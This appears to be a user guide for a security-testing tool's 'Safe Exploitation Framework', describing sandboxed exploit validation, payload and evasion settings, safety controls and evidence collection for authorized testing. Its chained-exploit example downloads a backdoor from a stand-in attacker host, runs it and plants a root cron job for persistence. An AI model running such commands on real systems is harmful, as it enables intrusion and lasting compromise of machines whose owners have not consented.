# Safe Exploitation Framework Guide

The Safe Exploitation Framework (SEF) provides a controlled environment for executing exploitation techniques with built-in safety mechanisms to prevent unintended consequences. This guide explains how to use the SEF to validate vulnerabilities while maintaining safety and control.

## Introduction

The Safe Exploitation Framework allows security professionals to:

- Validate vulnerabilities with proof-of-concept exploits
- Explore attack chains in a controlled environment
- Generate evidence of successful exploitations for reporting
- Maintain safety boundaries to prevent system damage
- Monitor and control exploitation attempts in real-time

## Core Components

The SEF consists of several key components:

1. **Sandbox Environment**: Isolated execution environment for running exploits
2. **Payload Generator**: Creates customized payloads based on discovered vulnerabilities
3. **Execution Monitor**: Tracks exploit execution and maintains safety boundaries
4. **Rollback Mechanism**: Reverts system changes if exploitation attempts exceed defined boundaries
5. **Evidence Collector**: Captures proof of successful exploitation for reporting

## Getting Started

### Basic Usage

To validate a vulnerability with the SEF:

```bash
sniper exploit --vulnerability CVE-2021-44228 --target https://example.com --safe
```

This command will:
1. Create a sandboxed environment
2. Generate an appropriate payload for the specified vulnerability
3. Attempt to exploit the vulnerability within safety boundaries
4. Collect evidence if successful
5. Generate a detailed report of the exploitation attempt

### Using a Configuration File

For more complex exploitation scenarios, you can define a YAML configuration file:

```yaml
vulnerability:
  id: "CVE-2021-44228"
  description: "Log4Shell Remote Code Execution"
  
target:
  url: "https://example.com/login"
  port: 8443
  protocol: "https"
  
payload:
  type: "command_injection"
  command: "id"
  encode: true
  evasion_techniques: ["url_encoding", "base64"]
  
safety:
  sandbox: "isolated"
  timeout: 30
  rollback: true
  memory_limit: "256M"
  network_restrictions: ["no_outbound"]
  
evidence:
  capture: ["screen", "traffic", "logs"]
  format: "html"
```

Run this configuration with:

```bash
sniper exploit --config log4shell.yaml
```

## Advanced Features

### Payload Customization

The SEF allows for detailed payload customization:

```yaml
payload:
  type: "command_injection"
  command: "id"
  encode: true
  evasion_techniques: ["url_encoding", "base64"]
  delivery_method: "http_header"
  header_name: "X-Forwarded-For"
  variants: 3
```

### Chained Exploits

You can define exploitation chains to simulate complex attack scenarios:

```yaml
exploitation_chain:
  - name: "initial_access"
    vulnerability: "CVE-2021-44228"
    payload: 
      type: "command_injection"
      command: "wget -O /tmp/backdoor http://attacker.com/backdoor"
      
  - name: "privilege_escalation"
    depends_on: "initial_access"
    vulnerability: "CVE-2021-3560"
    payload:
      type: "command_injection"
      command: "chmod +x /tmp/backdoor && /tmp/backdoor"
      
  - name: "persistence"
    depends_on: "privilege_escalation"
    vulnerability: "local_file_write"
    payload:
      type: "file_write"
      path: "/etc/cron.d/backdoor"
      content: "* * * * * root /tmp/backdoor"
```

### Exploitation Environment Configuration

Configure the environment where exploits will be executed:

```yaml
environment:
  type: "docker"
  image: "vulnerable-app:latest"
  network: "isolated"
  volumes:
    - "/tmp/evidence:/evidence"
  env_vars:
    - "DEBUG=true"
    - "VULNERABLE_MODE=true"
```

## Safety Mechanisms

### Sandbox Isolation

The SEF provides multiple levels of sandbox isolation:

- **Process**: Isolate within a separate process
- **Container**: Isolate within a Docker container
- **VM**: Isolate within a virtual machine
- **Network**: Isolate network access with strict firewall rules

```yaml
safety:
  sandbox: "container"
  container_options:
    read_only: true
    no_new_privileges: true
    drop_capabilities: ["ALL"]
```

### Execution Controls

Control the execution of exploits with detailed parameters:

```yaml
execution_control:
  timeout: 30
  max_memory: "256M"
  cpu_limit: "0.5"
  file_access: "read_only"
  allowed_directories: ["/tmp", "/var/www"]
  denied_commands: ["rm", "format", "dd"]
```

### Monitoring

Monitor exploitation attempts in real-time:

```yaml
monitoring:
  metrics: ["cpu", "memory", "network", "file_access"]
  log_level: "debug"
  alert_threshold:
    cpu: "80%"
    memory: "200M"
    suspicious_activity: true
```

## Evidence Collection

### Types of Evidence

The SEF can collect various types of evidence:

- **Screenshots**: Visual evidence of successful exploitation
- **Network Traffic**: Captured packets showing the exploitation
- **System Logs**: Log entries indicating compromise
- **Memory Dumps**: Memory snapshots for forensic analysis
- **File Changes**: Records of modified files

```yaml
evidence:
  capture:
    - type: "screenshot"
      frequency: "start_end"
    - type: "network"
      pcap: true
      interfaces: ["eth0"]
    - type: "logs"
      sources: ["/var/log/apache2/error.log", "/var/log/auth.log"]
    - type: "file_changes"
      directories: ["/etc", "/var/www"]
```

### Evidence Export

Export collected evidence in various formats:

```bash
sniper evidence export --format html --output exploitation_evidence.html
```

## Impact Assessment

The SEF includes an impact assessment module that evaluates the potential impact of successful exploitation:

```yaml
impact_assessment:
  evaluate:
    - "data_exposure"
    - "system_compromise"
    - "lateral_movement"
    - "persistence"
  scoring_system: "CVSS"
  report_format: "executive"
```

## Integration with Tool Orchestration

The SEF integrates with the [Tool Orchestration Framework](tool_orchestration.md) to create comprehensive security testing workflows:

```yaml
name: "Vulnerability Validation Workflow"
description: "Discover and validate vulnerabilities"
target: "${TARGET}"
tools:
  - name: "vulnerability-scan"
    tool: "nuclei"
    params: "-u ${TARGET} -t cves/ -severity critical,high"
    
  - name: "exploit-validation"
    tool: "exploitation-framework"
    depends_on: "vulnerability-scan"
    params: "--vulnerabilities ${vulnerability-scan.findings} --safe"
    safety:
      sandbox: "isolated"
      rollback: true
      monitoring: true
```

## Best Practices

1. **Always Use Safety Controls**: Never disable safety mechanisms unless absolutely necessary
2. **Start Small**: Begin with simple, well-understood vulnerabilities
3. **Isolated Testing**: Use dedicated testing environments separated from production
4. **Permission**: Ensure you have explicit permission to conduct exploitation attempts
5. **Documentation**: Document all exploitation attempts and results
6. **Clean-up**: Always verify that all changes have been properly rolled back
7. **Legal Compliance**: Ensure compliance with all applicable laws and regulations

## Troubleshooting

### Common Issues

1. **Sandbox Failures**: Verify that Docker/VM is properly configured
2. **Payload Generation Errors**: Check that the vulnerability details are accurate
3. **Timeout Issues**: Adjust timeout settings for complex exploits
4. **Evidence Collection Failures**: Ensure proper permissions on evidence directories
5. **Network Restrictions**: Verify that necessary network connectivity is allowed within safety boundaries

### Debugging Mode

Enable detailed debugging information:

```bash
sniper exploit --config exploit.yaml --debug --log-file debug.log
```
